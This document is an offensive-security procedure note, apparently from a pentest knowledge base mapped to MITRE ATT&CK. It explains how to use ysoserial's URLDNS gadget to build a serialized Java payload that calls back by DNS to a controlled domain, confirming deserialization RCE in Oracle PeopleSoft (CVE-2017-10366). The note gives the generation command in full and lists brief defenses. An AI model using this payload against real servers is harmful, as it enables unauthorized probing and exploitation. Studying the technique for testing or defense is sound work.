---
id: proc-generate-dns-payload
tags:
  - rce
  - payload
  - dns
type: procedure
tools:
  - '[[tools/ysoserial]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/java-generate-urldns-payload]]'
verified: false
platforms:
  - Linux
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploitation for Client Execution]]'
updated_at: '2025-12-14T17:23:27.734Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploitation for Client Execution]]'
---
# Generate-DNS-Lookup-Payload

## Summary

This procedure uses ysoserial to create a serialized Java payload with the URLDNS gadget, which triggers a DNS lookup to a controlled domain upon deserialization, confirming RCE without direct command execution.

## Description

In the context of exploiting CVE-2017-10366 in Oracle PeopleSoft's monitor service, the URLDNS gadget leverages Java's URL class to perform DNS resolution. This is ideal for blind RCE verification. Requires the built ysoserial JAR and a controlled DNS domain. The payload is output as binary to a file for transmission.

## Requirements

1. Built ysoserial JAR in current path
2. Controlled DNS domain (e.g., testing1.jexboss.info)
3. Java runtime environment

## Defense

Defensive measures and detection strategies:

- Implement deserialization allowlists or disable readObject()
- Monitor for unexpected DNS queries from application servers
- Use WAF rules to block suspicious binary POSTs to endpoints

## Objectives

1. Generate serialized gadget chain
2. Target DNS exfiltration for verification
3. Prepare payload for endpoint delivery

## Instructions

### Step 1: Run Ysoserial with URLDNS Gadget

**Context**: Invoke Java to execute ysoserial and redirect output to a payload file.

**Command** ([[commands/java-generate-urldns-payload]]):
```bash
java -jar ysoserial-0.0.6-SNAPSHOT-all.jar URLDNS http://testing1.jexboss.info > payload
```

> Generates the binary payload; expected output is a file 'payload' with ~1KB serialized data. No console errors.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Exploitation for Client Execution]]

### Sub-Techniques


## Commands Used

- [[commands/java-generate-urldns-payload]]

## Tools Used

- [[tools/ysoserial]]

## Tags

- rce
- payload
- dns
